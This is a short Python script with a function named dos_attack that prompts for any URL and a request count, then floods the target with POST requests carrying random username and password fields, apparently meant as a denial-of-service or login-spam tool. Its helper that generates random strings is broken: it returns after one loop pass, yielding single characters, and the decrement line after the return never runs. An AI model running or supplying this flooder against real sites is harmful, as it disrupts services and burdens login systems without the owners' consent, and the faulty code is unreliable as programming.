import requests 
import random
import string

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    while length:  
        random_string = ''.join(random.choice(characters))
        return random_string
        length -= 1

def dos_attack(url, requests_count): 
    while requests_count:
        name = generate_random_string(10)
        pas = generate_random_string(10)
        requests_count -= 1
        payload = {'username': name, 'password': pas}
        requests.post(url, data=payload)
        
url = input("Enter url: ")
request_count = int(input("Enter request count: "))
dos_attack(url, request_count) 